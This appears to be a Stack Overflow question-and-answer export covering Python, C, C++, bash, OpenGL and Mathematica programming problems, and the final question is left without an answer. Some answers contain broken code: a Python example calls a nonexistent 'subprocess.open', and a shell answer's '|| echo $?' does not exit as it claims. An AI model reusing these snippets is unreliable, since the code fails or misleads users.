"<p>I am writing a python script in windows. I want to do something based on the file size. For example, if the size is greater than 0, I will send email to somebody, otherwise continue to other things. How do I check the file size?</p>
","9530","","<p>Use <a href=""http://docs.python.org/library/os.html#os.stat""><code>os.stat</code></a>, and use the <code>st_size</code> member of the resulting structure:</p>

<pre><code>&gt;&gt;&gt; import os
&gt;&gt;&gt; statinfo = os.stat('somefile.txt')
&gt;&gt;&gt; statinfo
(33188, 422511L, 769L, 1, 1032, 100, 926L, 1105022698,1105022732, 1105022732)
&gt;&gt;&gt; statinfo.st_size
926L
</code></pre>
"
"<p>Does anyone know of an already-written Python script, tool, or editor that will check for unbalanced multi-line tokens? (parentheses, quotes, {}, [], etc.)</p>

<p>I've been writing Python code in IDLE, and every so often I'll get ""EOF token in multi-line statement"" and start swearing, because it means that somewhere in about 200 lines of code I forgot a closing parenthesis or quote and IDLE can't tell me where.  This seems like a fairly straightforward thing, I just don't really have the time or headspace to work it out myself right now.</p>

<p>Much thanks</p>
","9530","","<p><a href=""http://www.gnu.org/software/emacs/"" rel=""nofollow"">emacs</a> will automatically highlight matching pairs of parentheses/brackets/quotes/etc. as you type them, and it will inform you immediately if you mismatch them (e.g. if you type a <code>[</code> followed by a <code>)</code>).  I'm sure vim also does this, but since I don't use vim, I can't say with certainty.</p>
"
"<p>I want to print out a variable for type size_t in c but it appears that size_t is aliased to different variable types on different architextures. For example on one machine (64-bit) the following code does not throw any warmings:</p>

<pre><code>size_t size = 1;
printf(""the size is %ld"", size);
</code></pre>

<p>but on my other machine (32_bit) the above code produces the following warning message:</p>

<blockquote>
  <p>warning: format '%ld' expects type
  'long int *', but argument 3 has type
  'size_t *'</p>
</blockquote>

<p>I suspect this is due to the fact that one machine is 64-bit and the other is 32-bit, so that on my 64-bit machine size_t is aliased to a long int (%ld), whereas on my 32-bit machine size_t is aliased to another type. </p>

<p>Is there a format specifier specifically for size_t?</p>
","9530","","<p>Yes: use the <code>z</code> length modifier:</p>

<pre><code>size_t size = sizeof(char);
printf(""the size is %zd\n"", size);  // decimal size_t
printf(""the size is %zx\n"", size);  // hex size_t
</code></pre>

<p>The other length modifiers that are available are <code>hh</code> (for <code>char</code>), <code>h</code> (for <code>short</code>), <code>l</code> (for <code>long</code>), <code>ll</code> (for <code>long long</code>), <code>j</code> (for <code>intmax_t</code>), <code>t</code> (for <code>ptrdiff_t</code>), and <code>L</code> (for <code>long double</code>).  See §7.19.6.1 (7) of the C99 standard.</p>
"
"<p>If I have just entered the following command in Bash:</p>

<pre><code>echo foo
</code></pre>

<p>I can change foo to bar by typing:</p>

<pre><code>^foo^bar
</code></pre>

<p>Which results in the following command being executed:</p>

<pre><code>echo bar
</code></pre>

<p>Now if I enter:</p>

<pre><code>echo foo foo
</code></pre>

<p>Is there a way to change both instances of foo to bar just by using the caret (<code>^</code>) operator?</p>

<p>Additionally, are there man pages for shell operators like <code>^</code>? <code>man ^</code> results in ""No manual entry for ^"".</p>
","9530","","<p>That particular feature is called <em>quick substitution</em>; its documentation can be found in the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Event-Designators"">Event Designators</a> section of the Bash Manual.  You can't do what you want with quick substitution; you'll have to resort to something slightly more verbose:</p>

<pre><code>!!:gs/foo/bar/
</code></pre>
"
"<p>I have an openGL window that is 640x480 that I need to center in the middle of the screen. I previously used:</p>

<pre><code>glutInitWindowPosition((GetSystemMetrics(SM_CXSCREEN)-640)/2,
                       (GetSystemMetrics(SM_CYSCREEN)-480)/2);
</code></pre>

<p>which WORKED. </p>

<p>But now all of a sudden when I compile...</p>

<pre><code>Linking...
1&gt;Project1.obj : error LNK2028: unresolved token (0A000372) ""extern ""C"" int __stdcall GetSystemMetrics(int)"" (?GetSystemMetrics@@$$J14YGHH@Z) referenced in function ""int __cdecl main(int,char * *)"" (?main@@$$HYAHHPAPAD@Z)
1&gt;Project1.obj : error LNK2019: unresolved external symbol ""extern ""C"" int __stdcall GetSystemMetrics(int)"" (?GetSystemMetrics@@$$J14YGHH@Z) referenced in function ""int __cdecl main(int,char * *)"" (?main@@$$HYAHHPAPAD@Z)
1&gt;C:\Users\My Computer\Documents\School Stuff\CS445\Project1\Debug\Project1.exe : fatal error LNK1120: 2 unresolved externals
</code></pre>

<p>Someone please help. This is very annoying and frustrating for me as I don't know a lot about OpenGL and GLUT.</p>
","9530","","<p>You need to make sure you're linking against User32.lib, the static library where <a href=""http://msdn.microsoft.com/en-us/library/ms724385%28VS.85%29.aspx"" rel=""nofollow""><code>GetSystemMetrics()</code></a> is defined.  Open up your project settings and make sure the User32.lib is listed among all of the .libs that you're linking against.</p>
"
"<p>Lets say I have the following scripts</p>

<p><strong>a.sh</strong> </p>

<pre><code>echo in a
if test 1 -ne 2; then
        echo oops
        exit 1
fi
</code></pre>

<p><strong>b.sh</strong></p>

<pre><code>echo in b
./a.sh
echo in b 2
</code></pre>

<p>When running b.sh, I want it to exit if a.sh exited.
How do I do this?</p>

<p>(The current output is</p>

<pre><code>in b
in a
oops
in b 2
</code></pre>

<p>And that's not what I want)</p>

<p>Thanks,
Rivka</p>
","9530","","<p>I don't think there's a way you can do it without explicitly checking the return status of the subshell, e.g.:</p>

<pre><code># This will run b.sh, and if that exits with a non-zero status, we will also
# exit with that same status; otherwise, we continue.
./b.sh || echo $?
</code></pre>
"
"<p>Hey, if you can get a more descriptive tittle please edit it.</p>

<p>I'm writing a little algorithm that involves checking values in a matrix.
Let's say:</p>

<pre><code>char matrix[100][100];
char *ptr = &amp;matrix[0][0];
</code></pre>

<p>imagine i populate the matrix with a couple of values (5 or 6) of 1, like:</p>

<pre><code>matrix[20][35]=1;
matrix[67][34]=1;
</code></pre>

<p>How can I know if the binary value of an interval of the matrix is zero, for example (in pseudo code)</p>

<pre><code>if((the value from ptr+100 to ptr+200)==0){ ... // do something
</code></pre>

<p>I'm trying to pick up on c/c++ again. There should be a way of picking those one hundred bytes (which are all next to each other) and check if their value is all zeros without having to check on by one.(considering char is one byte)</p>
","9530","","<p>There's no built-in language feature to do that, nor is there a standard library function to do it.  <a href=""http://linux.die.net/man/3/memcmp"" rel=""nofollow""><code>memcmp()</code></a> could work, but you'd need a second array of all zeroes to compare against; that array would have to be large, and you'd also eat up unnecessary memory bandwidth in doing the comparison.</p>

<p>Just write the function yourself, it's not that hard.  If this truly is the bottleneck of your application (which you should only conclude of <strong>profiling</strong>), then rewrite that function in assembly.</p>
"
"<blockquote>
  <p><strong>Possible Duplicates:</strong><br>
  <a href=""http://stackoverflow.com/questions/1388753/how-to-get-output-from-subprocess-popen"">How to get output from subprocess.Popen()</a><br>
  <a href=""http://stackoverflow.com/questions/1996518/retrieving-the-output-of-subprocess-call"">Retrieving the output of subprocess.call()</a>  </p>
</blockquote>



<p>Here is my question. I have an executable called device_console. The device_console provides a command line interface to a device. In device_console, four commands can be run: status, list, clear and exit. Each command produces an output. As an example:</p>

<pre><code>[asdfgf@localhost ~]$ device_console

device_console&gt; list

File A

File B

device_console&gt; status
Status: OK

device_console&gt; clear
All files cleared

device_console&gt; list
device_console&gt; exit

[asdfgf@localhost ~]$
</code></pre>

<p>As part of testing, I want to get the output of each command. I want to use Python for it. I am looking at Python's subprocess, but somehow I am unable to put them together. Can you please help?</p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/subprocess.html"" rel=""nofollow""><code>subprocess</code> module</a>.  Example:</p>

<pre><code>import subprocess

# Open the subprocess
proc = subprocess.open('device_console', stdin=subprocess.PIPE, stdout.subprocess.PIPE)

# Write a command
proc.stdin.write('list\n')

# Read the results back -- this will block until a line of input is received
listing = proc.stdout.readline()

# When you're done, close the input stream so the subprocess knows to exit
proc.stdin.close()

# Wait for subprocess to exit (optional) and get its exit status
exit_status = proc.wait()
</code></pre>
"
"<p>I found this in initramfs.c, I haven't seen this syntax before, could some one explain what it is doing?</p>

<pre><code>static __initdata int (*actions[])(void) = {
  [Start]   = do_start,
  [Collect] = do_collect,
  [GotHeader] = do_header,
  [SkipIt]  = do_skip,
  [GotName] = do_name,
  [CopyFile]  = do_copy,
  [GotSymlink]  = do_symlink,
  [Reset]   = do_reset,
};
</code></pre>

<p>Source Code (line 366): <a href=""http://www.gelato.unsw.edu.au/lxr/source/init/initramfs.c"">initramfs.c</a> </p>
","9530","","<p>This is a feature from ISO C99 known as <a href=""http://gcc.gnu.org/onlinedocs/gcc/Designated-Inits.html"">designated initializers</a>.  It creates an array and initializes specific elements of that array, not necessarily the first N in order.  It's equivalent to the following snippet:</p>

<pre><code>static __initdata int (*actions[SOME_SIZE])(void);
actions[Start]   = do_start;
actions[Collect] = do_collect;
actions[GotHeader] = do_header;
actions[SkipIt]  = do_skip;
actions[GotName] = do_name;
actions[CopyFile]  = do_copy;
actions[GotSymlink]  = do_symlink;
actions[Reset]   = do_reset;
</code></pre>

<p>Except that the array will only be as large as it needs to (equal in size to one more than the largest index), and it can be initialized statically at global scope -- you can't run the above code at global scope.</p>

<p>This is not a feature of ANSI C89, but GCC provides this feature as an extension even when compiling code as C89.</p>
"
"<p>I want to embed a file in a program. It will be used for default configuration files if none are provided. I have realized I could just use default values, but I want to extract the file and place it on the disk so it can be modified.</p>
","9530","","<p>One common thing you can do is to represent the file data as an array of static bytes:</p>

<pre><code>// In a header file:
extern const char file_data[];
extern const size_t file_data_size;

// In a source file:
const char file_data[] = {0x41, 0x42, ... };  // etc.
const size_t file_data_size = sizeof(file_data);
</code></pre>

<p>Then the file data will just be a global array of bytes compiled into your executable that you can reference anywhere.  You'll have to either rewrite your file processing code to be able to handle a raw byte array, or use something like <a href=""http://linux.die.net/man/3/fmemopen"" rel=""nofollow""><code>fmemopen(3)</code></a> to open a pseudo-file handle from the data and pass that on to your file handling code.</p>

<p>Of course, to get the data into this form, you'll need to use some sort of preprocessing step to convert the file into a byte array that the compiler can accept.  A makefile would be good for this.</p>
"
"<p>Anyone can tell me that how can I get the total life age (usage time), Modal Number, software version of the iPhone using obj c.
Also how can we check that iphone is jailbroken or not using objective C.</p>

<p>Thanks
MAS</p>
","9530","","<p>I don't know about the usage time, but you can get the device type and OS version from the <a href=""http://developer.apple.com/iphone/library/documentation/uikit/reference/UIDevice_Class/Reference/UIDevice.html"" rel=""nofollow"">UIDevice class</a>:</p>

<pre><code>NSLog(@""Device type: %@\niOS version: %@\n"",
    [UIDevice currentDevice].model,
    [UIDevice currentDevice].systemVersion);
// Might output this:
Device type: iPhone
iOS version: 2.0
</code></pre>
"
"<p>If you have an object file, how do you get the initialized value of a global variable in that object file's data segment?  For example, say I've done the following:</p>

<pre><code># I'm interested in the variable foo inside bar.o in libbar.a:
$ ar -x libbar.a bar.o
$ nm --print-size bar.o | grep foo
00000048 00000004 D foo
</code></pre>

<p>This tells me that <code>foo</code> is at offset 0x48 in the data segment with size 4, but how do I obtain the actual initialized value it obtains upon load?</p>
","9530","","<p>Figured it out:</p>

<pre><code>objdump -j.data -s bar.o
</code></pre>

<p>This gives a hexdump of the data segment, making it easy to look up values.  I've used <code>objdump -d</code> before to disassemble code, but the <code>-s</code> option is new to me.</p>
"
"<p>In Mathematica,</p>

<ol>
<li>How can I create a list of length n
and fill with zeroes?</li>
<li>How can I
create a vector of length n and fill
with zeroes?</li>
</ol>
","9530","","<p>In Mathematica, there's no distinction between lists and vectors.  You can use the <a href=""http://reference.wolfram.com/mathematica/ref/Table.html"" rel=""nofollow""><code>Table</code></a> function to generate a list of length n:</p>

<pre><code>x = Table[0, {n}]
(* If n was 4, x would now be the list {0, 0, 0, 0} *)
</code></pre>
"
"<p>What's the bare skeleton to get a triangle drawn on an OpenGL window in C on OSX? I've gone through the tutorials at Nehe and tried to get it working, but the CreateGLWindow seems hopelessly tied to win32.</p>

<p>I want to stick to just opengl and glut, etc. I'll be eventually wrapping this in scheme, but I'd like to have a firmer understanding at the c-level beforehand.</p>

<p>Here's what I have thus far:</p>

<pre><code>#include &lt;OpenGL/gl.h&gt;// Header File For The OpenGL32 Library
#include &lt;OpenGL/glu.h&gt;// Header File For The GLu32 Library
#include &lt;GLUT/glut.h&gt;// Header File For The GLut Library

#define kWindowWidth 400;
#define kWindowHeight 300;

HGLRC hRC=NULL;// Permanent Rendering Context
HDC             hDC=NULL;// Private GDI Device Context
HWND            hWnd=NULL;// Holds Our Window Handle
HINSTANCE       hInstance;// Holds The Instance Of The Application

LRESULTCALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);// Declaration For WndProc

boolkeys[256];// Array Used For The Keyboard Routine
boolactive=TRUE;// Window Active Flag Set To TRUE By Default
boolfullscreen=TRUE;// Fullscreen Flag Set To Fullscreen Mode By Default

GLvoid ReSizeGLScene(GLsizei width, GLsizei height)// Resize And Initialize The GL Window
{
  if (height==0)// Prevent A Divide By Zero By
    {
      height=1;// Making Height Equal One
    }

  glViewport(0, 0, width, height);// Reset The Current Viewport
  glMatrixMode(GL_PROJECTION);// Select The Projection Matrix
  glLoadIdentity();// Reset The Projection Matrix

  // Calculate The Aspect Ratio Of The Window
  gluPerspective(45.0f,(GLfloat)width/(GLfloat)height,0.1f,100.0f);

  glMatrixMode(GL_MODELVIEW);// Select The Modelview Matrix
  glLoadIdentity();// Reset The Modelview Matrix
}

int InitGL(GLvoid)// All Setup For OpenGL Goes Here
{
  glShadeModel(GL_SMOOTH);// Enables Smooth Shading
  glClearColor(0.0f, 0.0f, 0.0f, 0.0f);// Black Background
  glClearDepth(1.0f);// Depth Buffer Setup
  glEnable(GL_DEPTH_TEST);// Enables Depth Testing
  glDepthFunc(GL_LEQUAL);// The Type Of Depth Test To Do
  glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);// Really Nice Perspective Calculations

  return TRUE;// Initialization Went OK
}

int DrawGLScene(GLvoid)// Here's Where We Do All The Drawing
{
  glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);// Clear The Screen And The Depth Buffer
  glLoadIdentity();// Reset The Current Modelview Matrix
  return TRUE;// Everything Went OK
}

GLvoid KillGLWindow(GLvoid)// Properly Kill The Window
{
  if (fullscreen)// Are We In Fullscreen Mode?
    {
      ChangeDisplaySettings(NULL,0);// If So Switch Back To The Desktop
      ShowCursor(TRUE);// Show Mouse Pointer
    }

  if (hRC)// Do We Have A Rendering Context?
    {
      if (!wglMakeCurrent(NULL,NULL))// Are We Able To Release The DC And RC Contexts?
        {
          MessageBox(NULL,""Release Of DC And RC Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
        }
      if (!wglDeleteContext(hRC))// Are We Able To Delete The RC?
        {
          MessageBox(NULL,""Release Rendering Context Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
        }
      hRC=NULL;// Set RC To NULL
    }
  if (hDC &amp;&amp; !ReleaseDC(hWnd,hDC))// Are We Able To Release The DC
    {
      MessageBox(NULL,""Release Device Context Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hDC=NULL;// Set DC To NULL
    }

  if (hWnd &amp;&amp; !DestroyWindow(hWnd))// Are We Able To Destroy The Window?
    {
      MessageBox(NULL,""Could Not Release hWnd."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hWnd=NULL;// Set hWnd To NULL
    }

  if (!UnregisterClass(""OpenGL"",hInstance))// Are We Able To Unregister Class
    {
      MessageBox(NULL,""Could Not Unregister Class."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hInstance=NULL;// Set hInstance To NULL
    }
}

BOOL CreateGLWindow(char* title, int width, int height, int bits, bool fullscreenflag)
{
  GLuintPixelFormat;// Holds The Results After Searching For A Match
  WNDCLASSwc;// Windows Class Structure

  DWORDdwExStyle;// Window Extended Style
  DWORDdwStyle;// Window Style

  RECT WindowRect;// Grabs Rectangle Upper Left / Lower Right Values
  WindowRect.left=(long)0;// Set Left Value To 0
  WindowRect.right=(long)width;// Set Right Value To Requested Width
  WindowRect.top=(long)0;// Set Top Value To 0
  WindowRect.bottom=(long)height;// Set Bottom Value To Requested Height

  fullscreen=fullscreenflag;// Set The Global Fullscreen Flag

  hInstance= GetModuleHandle(NULL);// Grab An Instance For Our Window
  wc.style= CS_HREDRAW | CS_VREDRAW | CS_OWNDC;// Redraw On Move, And Own DC For Window
  wc.lpfnWndProc= (WNDPROC) WndProc;// WndProc Handles Messages
  wc.cbClsExtra= 0;// No Extra Window Data
  wc.cbWndExtra= 0;// No Extra Window Data
  wc.hInstance= hInstance;// Set The Instance
  wc.hIcon= LoadIcon(NULL, IDI_WINLOGO);// Load The Default Icon
  wc.hCursor= LoadCursor(NULL, IDC_ARROW);// Load The Arrow Pointer
  wc.hbrBackground= NULL;// No Background Required For GL
  wc.lpszMenuName= NULL;// We Don't Want A Menu
  wc.lpszClassName= ""OpenGL"";// Set The Class Name

  if (!RegisterClass(&amp;wc))// Attempt To Register The Window Class
    {
      MessageBox(NULL,""Failed To Register The Window Class."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Exit And Return FALSE
    }

  if (fullscreen)// Attempt Fullscreen Mode?
    {
      DEVMODE dmScreenSettings;// Device Mode
      memset(&amp;dmScreenSettings,0,sizeof(dmScreenSettings));// Makes Sure Memory's Cleared
      dmScreenSettings.dmSize=sizeof(dmScreenSettings);// Size Of The Devmode Structure
      dmScreenSettings.dmPelsWidth= width;// Selected Screen Width
      dmScreenSettings.dmPelsHeight= height;// Selected Screen Height
      dmScreenSettings.dmBitsPerPel= bits;// Selected Bits Per Pixel
      dmScreenSettings.dmFields=DM_BITSPERPEL|DM_PELSWIDTH|DM_PELSHEIGHT;

      // Try To Set Selected Mode And Get Results.  NOTE: CDS_FULLSCREEN Gets Rid Of Start Bar.
      if (ChangeDisplaySettings(&amp;dmScreenSettings,CDS_FULLSCREEN)!=DISP_CHANGE_SUCCESSFUL)
        {
          // If The Mode Fails, Offer Two Options.  Quit Or Run In A Window.
          if (MessageBox(NULL,""The Requested Fullscreen Mode Is Not Supported By\nYour Video Card. Use Windowed Mode Instead?"",""NeHe GL"",MB_YESNO|MB_ICONEXCLAMATION)==IDYES)
            {
              fullscreen=FALSE;// Select Windowed Mode (Fullscreen=FALSE)
            }
          else
            {
              // Pop Up A Message Box Letting User Know The Program Is Closing.
              MessageBox(NULL,""Program Will Now Close."",""ERROR"",MB_OK|MB_ICONSTOP);
              return FALSE;// Exit And Return FALSE
            }
        }
    }

  if (fullscreen)// Are We Still In Fullscreen Mode?
    {
      dwExStyle=WS_EX_APPWINDOW;// Window Extended Style
      dwStyle=WS_POPUP;// Windows Style
      ShowCursor(FALSE);// Hide Mouse Pointer
    }
  else
    {
      dwExStyle=WS_EX_APPWINDOW | WS_EX_WINDOWEDGE;// Window Extended Style
      dwStyle=WS_OVERLAPPEDWINDOW;// Windows Style
    }

  AdjustWindowRectEx(&amp;WindowRect, dwStyle, FALSE, dwExStyle);// Adjust Window To True Requested Size

  if (!(hWnd=CreateWindowEx(dwExStyle,// Extended Style For The Window
                            ""OpenGL"",// Class Name
                            title,// Window Title
                            WS_CLIPSIBLINGS |// Required Window Style
                            WS_CLIPCHILDREN |// Required Window Style
                            dwStyle,// Selected Window Style
                            0, 0,// Window Position
                            WindowRect.right-WindowRect.left,// Calculate Adjusted Window Width
                            WindowRect.bottom-WindowRect.top,// Calculate Adjusted Window Height
                            NULL,// No Parent Window
                            NULL,// No Menu
                            hInstance,// Instance
                            NULL)))// Don't Pass Anything To WM_CREATE
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Window Creation Error."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  staticPIXELFORMATDESCRIPTOR pfd=// pfd Tells Windows How We Want Things To Be
    {
      sizeof(PIXELFORMATDESCRIPTOR),// Size Of This Pixel Format Descriptor
      1,// Version Number
      PFD_DRAW_TO_WINDOW |// Format Must Support Window
      PFD_SUPPORT_OPENGL |// Format Must Support OpenGL
      PFD_DOUBLEBUFFER,// Must Support Double Buffering
      PFD_TYPE_RGBA,// Request An RGBA Format
      bits,// Select Our Color Depth
      0, 0, 0, 0, 0, 0,// Color Bits Ignored
      0,// No Alpha Buffer
      0,// Shift Bit Ignored
      0,// No Accumulation Buffer
      0, 0, 0, 0,// Accumulation Bits Ignored
      16,// 16Bit Z-Buffer (Depth Buffer)
      0,// No Stencil Buffer
      0,// No Auxiliary Buffer
      PFD_MAIN_PLANE,// Main Drawing Layer
      0,// Reserved
      0, 0, 0// Layer Masks Ignored
    };

  if (!(hDC=GetDC(hWnd)))// Did We Get A Device Context?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Create A GL Device Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if (!(PixelFormat=ChoosePixelFormat(hDC,&amp;pfd)))// Did Windows Find A Matching Pixel Format?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Find A Suitable PixelFormat."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if(!SetPixelFormat(hDC,PixelFormat,&amp;pfd))// Are We Able To Set The Pixel Format?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Set The PixelFormat."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if (!(hRC=wglCreateContext(hDC)))// Are We Able To Get A Rendering Context?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Create A GL Rendering Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if(!wglMakeCurrent(hDC,hRC))// Try To Activate The Rendering Context
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Activate The GL Rendering Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  ShowWindow(hWnd,SW_SHOW);// Show The Window
  SetForegroundWindow(hWnd);// Slightly Higher Priority
  SetFocus(hWnd);// Sets Keyboard Focus To The Window
  ReSizeGLScene(width, height);// Set Up Our Perspective GL Screen

  if (!InitGL())// Initialize Our Newly Created GL Window
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Initialization Failed."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }
  return TRUE;// Success
}

LRESULT CALLBACK WndProc(HWNDhWnd,// Handle For This Window
                         UINTuMsg,// Message For This Window
                         WPARAMwParam,// Additional Message Information
                         LPARAMlParam)// Additional Message Information
{
  switch (uMsg)// Check For Windows Messages
    {
    case WM_ACTIVATE:// Watch For Window Activate Message
      {
        if (!HIWORD(wParam))// Check Minimization State
          {
            active=TRUE;// Program Is Active
          }
        else
          {
            active=FALSE;// Program Is No Longer Active
          }

        return 0;// Return To The Message Loop
      }
    case WM_SYSCOMMAND:// Intercept System Commands
      {
        switch (wParam)// Check System Calls
          {
          case SC_SCREENSAVE:// Screensaver Trying To Start?
          case SC_MONITORPOWER:// Monitor Trying To Enter Powersave?
            return 0;// Prevent From Happening
          }
        break;// Exit
      }
    case WM_CLOSE:// Did We Receive A Close Message?
      {
        PostQuitMessage(0);// Send A Quit Message
        return 0;// Jump Back
      }
    case WM_KEYDOWN:// Is A Key Being Held Down?
      {
        keys[wParam] = TRUE;// If So, Mark It As TRUE
        return 0;// Jump Back
      }
    case WM_KEYUP:// Has A Key Been Released?
      {
        keys[wParam] = FALSE;// If So, Mark It As FALSE
        return 0;// Jump Back
      }
    case WM_SIZE:// Resize The OpenGL Window
      {
        ReSizeGLScene(LOWORD(lParam),HIWORD(lParam));// LoWord=Width, HiWord=Height
        return 0;// Jump Back
      }
    }
  // Pass All Unhandled Messages To DefWindowProc
  return DefWindowProc(hWnd,uMsg,wParam,lParam);
}

GLvoid InitGL(GLvoid);
GLvoid DrawGLScene(GLvoid);
GLvoid ReSizeGLScene(int Width, int Height);

int main(int argc, char** argv)
{
  glutInit(&amp;argc, argv);
  glutInitDisplayMode (GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);
  glutInitWindowSize (kWindowWidth, kWindowHeight);
  glutInitWindowPosition (100, 100);
  glutCreateWindow (argv[0]);

  InitGL();

  glutDisplayFunc(DrawGLScene);
  glutReshapeFunc(ReSizeGLScene);

  glutMainLoop();

  return 0;
}
</code></pre>
","9530","","<p>NeHe has a tutorial for setting up an OpenGL window on Mac OS X with GLUT <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=Mac_OS_X"" rel=""nofollow"">here</a>.  They also provide the code for all of the lessons for various different platforms.  If you scroll to the bottom of <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=02"" rel=""nofollow"">lesson 2</a>, you can download the lesson code ready to go for a number of platforms.  You probably want either the GLUT sample or the Mac OS X/Cocoa sample.</p>
"
"<p>In the following code</p>

<pre><code>#include&lt;iostream&gt;

 template&lt;typename T,size_t N&gt; 
 void cal_size(T (&amp;a)[N])
 { 
     std::cout&lt;&lt;""size of array is: ""&lt;&lt;N&lt;&lt;std::endl;
 }

 int main()
 {
     int a[]={1,2,3,4,5,6};
     int b[]={1};

     cal_size(a);
     cal_size(b);
 }
</code></pre>

<p>As expected the size of both the arrays gets printed. But how does N automatically gets initialized to the correct value of the array-size  (arrays are being passed by reference)?  How is the above code working?</p>
","9530","","<p>It works because the type of <code>a</code> is ""array of length 6 of <code>int</code>"" and the type of <code>b</code> is ""array of length 1 of <code>int</code>"".  The compiler knows this, so it can call the correct function.  In particular, the first call calls the template instance <code>cal_size&lt;6&gt;()</code> and the second call calls <code>cal_size&lt;1&gt;()</code>, since those are the only template instantiations which match their respective arguments.</p>

<p>If you attempted to call an explicit template instance, it would only work if you got the size right, otherwise the arguments wouldn't match.  Consider the following:</p>

<pre><code>cal_size(a);    // ok, compiler figures out implicitly that N=6
cal_size&lt;int, 6&gt;(a); // also ok, same result as above
cal_size&lt;int, 5&gt;(a); // ERROR: a is not of type ""array of length 5 of int""
</code></pre>
"
"<p>Does your editor/ide highlight that <code>a++;</code> in this C/C++ code as part of a comment?</p>

<pre><code>int a=1;
//some comment \
a++;
printf(""%d\n"",a);
</code></pre>

<p>And what about this?</p>

<pre><code>int a=1;
//some comment ??/
a++;
printf(""%d\n"",a);
</code></pre>
","9530","","<p>emacs 22.3.1: No to both, sadly</p>
"
"<p>I'd like to convert the output of <code>diff</code> (on a Markdown file) to
Markdown with <code>&lt;strike&gt;</code> and <code>&lt;em&gt;</code> tags, so that I can see what has
been removed from or added to a new version of a document.  (This kind of
treatment is very common for legal documents.)  </p>

<p>Example of hoped-for output:</p>

<blockquote>
  <p><em>Why do we</em><strike>We</strike> study programming languages<em>?</em> <strike>not</strike><em>Not</em> in order to ...</p>
</blockquote>

<p>One of the many
difficulties is that diff's output is line-oriented, where I want to
see differences in individual words.  Does anyone have suggestions as
to what algorithm to use, or what software to build on?</p>
","9530","","<p>Use <a href=""http://www.gnu.org/software/wdiff/"">wdiff</a>.  It already does the word-by-word comparison you're looking for; converting its output to markdown should take just a few simple regular expressions.</p>

<p>For example:</p>

<pre><code>$ cat foo
Why do we study programming languages?  Not in order to
$ cat bar
We study programming languages not in order to
$ wdiff foo bar
[-Why do we-]{+We+} study programming [-languages?  Not-] {+languages not+} in order to
$ wdiff foo bar | sed 's|\[-|&lt;em&gt;|g;s|-]|&lt;/em&gt;|g;s|{+|&lt;strike&gt;|g;s|+}|&lt;/strike&gt;|g'
&lt;em&gt;Why do we&lt;/em&gt;&lt;strike&gt;We&lt;/strike&gt; study programming &lt;em&gt;languages?  Not&lt;/em&gt; &lt;strike&gt;languages not&lt;/strike&gt; in order to
</code></pre>

<p>Edit: Actually, wdiff has some options that make it even easier:</p>

<pre><code>$ wdiff -w '&lt;em&gt;' -x '&lt;/em&gt;' -y '&lt;strike&gt;' -z '&lt;/strike&gt;' foo bar
&lt;em&gt;Why do we&lt;/em&gt;&lt;strike&gt;We&lt;/strike&gt; study programming &lt;em&gt;languages?  Not&lt;/em&gt; &lt;strike&gt;languages not&lt;/strike&gt; in order to
</code></pre>
"
"<p>I'm beginning python and I'm trying to use a two-dimensional list, that I initially fill up with the same variable in every place. I came up with this:</p>

<pre><code>def initialize_twodlist(foo):
    twod_list = []
    new = []
    for i in range (0, 10):
        for j in range (0, 10):
            new.append(foo)
        twod_list.append(new)
        new = []
</code></pre>

<p>It gives the desired result, but feels like a workaround. Is there an easier/shorter/more elegant way to do this?</p>
","9530","","<p>You can use a <a href=""http://docs.python.org/tutorial/datastructures.html#list-comprehensions"">list comprehension</a>:</p>

<pre><code>x = [[foo for i in range(10)] for j in range(10)]
# x is now a 10x10 array of 'foo' (which can depend on i and j if you want)
</code></pre>
"
"<p>In C++, I've written a mathematical program (for diffusion limited aggregation) where each new point calculated is dependent on all of the preceding points.
Is it possible to have such a program work in a parallel or distributed manner to increase computing speed?
If so, what type of modifications to the code would I need to look into?</p>

<p>EDIT: My source code is available at...
<a href=""http://www.bitbucket.org/damigu78/brownian-motion/downloads/"" rel=""nofollow"">http://www.bitbucket.org/damigu78/brownian-motion/downloads/</a>
filename is DLA_full3D.cpp
I don't mind significant re-writes if that's what it would take.  After all, I want to learn how to do it.</p>
","9530","","<p>There is <a href=""http://supertech.csail.mit.edu/cilk/"" rel=""nofollow"">cilk</a>, which is an enhancement to the C language (unfortunately not C++ (yet)) that allows you to add some extra information to your code.  With just a few minor hints, the compiler can automatically parallelize parts of your code, such as running multiple iterations of a <code>for</code> loop in parallel instead of in series.</p>
"
"<p>How would I download files (video) with Python using wget and save them locally? There will be a bunch of files, so how do I know that one file is downloaded so as to automatically start downloding another one?</p>

<p>Thanks.</p>
